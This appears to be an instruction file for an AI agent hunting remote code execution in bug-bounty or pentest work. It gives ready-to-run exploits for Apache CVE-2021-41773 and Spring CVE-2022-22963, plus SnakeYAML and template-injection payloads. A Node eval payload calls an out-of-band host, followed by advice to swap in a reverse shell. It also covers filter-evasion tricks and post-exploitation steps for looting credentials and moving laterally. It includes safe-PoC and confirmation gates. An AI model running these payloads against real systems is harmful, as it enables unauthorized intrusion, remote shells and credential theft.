---
name: hunt-rce
description: RCE hunting - template injection, YAML/XML deserialization, dependency confusion, Kubernetes surfaces, CVE-specific exploits (Apache CVE-2021-41773, Spring CVE-2022-22963). OOB-mandatory for blind cases. Wiki-first, FIND schema output.
---

# Hunt: Remote Code Execution

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "remote code execution command injection template injection deserialization CVE" via wiki-search MCP
```

Hub: [[web-moc]] (live web index). Primary page: [[os-command-injection]]. Payload arsenal: `wiki/payloads/command-injection.md`.
Anchors: [[ssti]], [[insecure-deserialization]].

## Attack surface signals

**Rank before probing.** Not every free-text field is equally likely to reach an interpreter:

- **Config / template editors** - Nomad, CI job specs, notification templates: user text is compiled, not just stored.
- **Import / render / export endpoints** - `?template=`, `?url=`, document generation, PDF/HTML renderers.
- **Admin and management consoles** - richer surface, weaker input handling, often the shortest path.
- **Deserialization sinks** - any endpoint eating a serialized blob (magic bytes, `!!` YAML tags, Java `AC ED`, PHP `O:`).
- **Version-pinned components** - a fingerprinted Apache 2.4.49 / Spring Cloud Function beats blind probing.

URL patterns: `/management-console/*`, `/admin/settings/*`, `/webhook/*`, `/render?template=`, `/import?url=`

Tech stack signals:
| Signal | RCE Vector |
|--------|-----------|
| Nomad config UI editable | Go text/template injection |
| SnakeYAML in classpath | `!!javax.script.ScriptEngineManager` |
| ingress-nginx annotations | Path field regex bypass |
| Spring Boot `*-routing-expression` header | SpEL injection |
| `X-GitHub-Enterprise-Version` | Nomad/collectd/syslog-ng config injection |

## Methodology
0. **Prefer a vetted module over a hand-rolled exploit.** For a known CVE/product, check Metasploit
   FIRST: `bash /root/vm.sh "msfconsole -q -x 'search <cve-or-product>; exit'"`. If a module exists,
   run it non-interactively (`use <mod>; set RHOSTS <ip>; set LHOST <vpn-ip>; run -z; sessions -l;
   exit`) rather than writing bespoke exploit code - faster, more reliable, and the exploit logic
   lives in the vetted module. Hand-roll only when no module fits.
1. Map execution contexts: template engines, shell commands, YAML parsers, file paths, package resolution
2. Enumerate admin/management interfaces: `/management-console`, `/admin`, `/_internal`, `/setup`
3. Template injection probe in every config/free-text field:
```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
```
Look for `49` in response, logs, or OOB DNS callbacks.

3b. **Server-side eval/exec sink (Node/Python/Ruby `cmd`-style param):** an endpoint that returns a
FIXED message/200 for EVERY body may be `eval()`-ing a specific param and swallowing the error.
**Response-diff param-mining MISSES this** (`cmd=test` -> eval error -> same message), so mine with an
actual PAYLOAD + OOB, and test BOTH the query-string AND the body (the sink is often on ONE of them
only). Node example: `curl -sG -X POST --data-urlencode 'cmd=require("child_process").exec("curl http://OOB/x")' TARGET` -> a callback confirms the sink; then swap the payload for a reverse shell. (Seen on a Node/Express box: a `POST /api/<x>?cmd=` **query** param was eval'd server-side while the body/form `cmd` did nothing.)

4. YAML deserialization:
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR_COLLAB/exploit.jar"]]]
]
```

5. Apache CVE-2021-41773/42013 (Apache 2.4.49/2.4.50):
```bash
# File read
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# RCE (cgi-bin alias required)
curl --path-as-is -X POST \
  -d "echo Content-Type: text/plain; echo; id" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

6. Spring Cloud Function SpEL (CVE-2022-22963):
```bash
curl -X POST http://target:8080/functionRouter \
  -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

7. Chain: low-severity misconfig (CSRF, traversal) + RCE primitive = critical
8. **Distill (when confirmed)** a reusable template bypass / new CVE, GENERIC, no client host:
`python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/os-command-injection.md`

**Safe-PoC first.** Every probe above runs `id` (or a bare OOB callback), never a destructive command. Only after a callback or command output confirms the sink do you swap in a reverse shell. Never run a state-changing command (delete, overwrite, service restart) to prove exec - `id` proves it and destroys nothing.

## Template Injection RCE Payloads
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```

## Evasion

When a probe is filtered rather than absent, the sink may still be reachable:

- **Command filters:** `$IFS` (or `${IFS}`) for blocked spaces, quote/backslash breaking (`c""url`, `w\get`), `base64 -d | sh`, wildcard globbing (`/???/??t`), `$(...)` / backticks, and env-var indirection.
- **Template keyword filters:** rebuild blocked names via attribute access and concatenation (Jinja `request|attr('application')...`, `'os'` assembled from chars) rather than the literal `os`/`popen`.
- **WAF on the body:** move the payload to the query string (or vice versa) - the eval sink in step 3b frequently lives on only one of them.

Marker discipline (`hunt-core`): use a unique 8+ char canary in reflected/SSTI probes, never `test`, and check the baseline for it before claiming reflection.

## Confirmation gate

**NOT confirmation:**
- a delayed response alone - load or a slow upstream, not proof of `sleep`.
- an error echoing your input - reflection is not execution.
- a `500` / stack trace - a parser choking is not code running.
- `{{7*7}}` returned literally, or a fixed `200` for every body (the eval-swallow case in 3b).
- `49` from `{{7*7}}` on its own - that is template evaluation, not yet an exec primitive.

**IS confirmation:**
- injected command output in the response matching what you ran (e.g. `uid=... gid=...` from `id`), reproduced in a clean session against your own written steps.
- for SSTI: `49` PLUS a follow-up payload that reaches an `os`/runtime primitive and returns its output.
- for blind (no output channel): an out-of-band callback correlated to your planted token - see below.

**Blind RCE is OOB-gated, never inferred.** Plant an interactsh / Burp Collaborator token, then append a row to `targets/<eng>/oob.md`:
```
| <token> | <sink url+param> | rce | <date> | waiting | |
```
(columns: token | sink | class | planted | status | source; token = your unique interactsh/Collaborator label). The recon-capture hook auto-correlates an incoming callback to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. **Do NOT claim a blind RCE without a HIT row.**

**Drive load-bearing exploit requests through Burp Repeater** (`Skill(hunt-burp)` / Burp MCP) so the operator can replay the injection; fuzz belongs in Intruder, not a hand-rolled loop.

## Chaining

RCE is rarely the finish line. Once exec is confirmed:

- **Loot credentials from the foothold** - env vars, config files, cloud metadata, `.git-credentials`, connection strings. Hand off to `hunt-secrets`.
- **Lateral movement** - reused creds, service tokens, and internal trust from the RCE host pivot into the domain. Hand off to `hunt-ad`.
- **Vector-specific siblings** - a serialized-blob sink is `hunt-deserialization`; a container/orchestrator surface is `hunt-cloud`.

Report the chain, not just the primitive: pre-auth RCE plus credential reuse implicates far more than the one host.

## Severity

| Outcome | Severity |
|---|---|
| Command output returned or OOB callback received (RCE) | critical |
| SSTI reflected, reaches output but no exec primitive | high |
| SSTI sandboxed - arithmetic only, no sandbox escape | medium |

Rate on demonstrated execution, not the theoretical ceiling. **Unauthenticated / pre-auth RCE outranks post-auth by a band.** A sink you can only trigger with a precondition you cannot meet (an admin-only field, an unreachable header) lowers it.
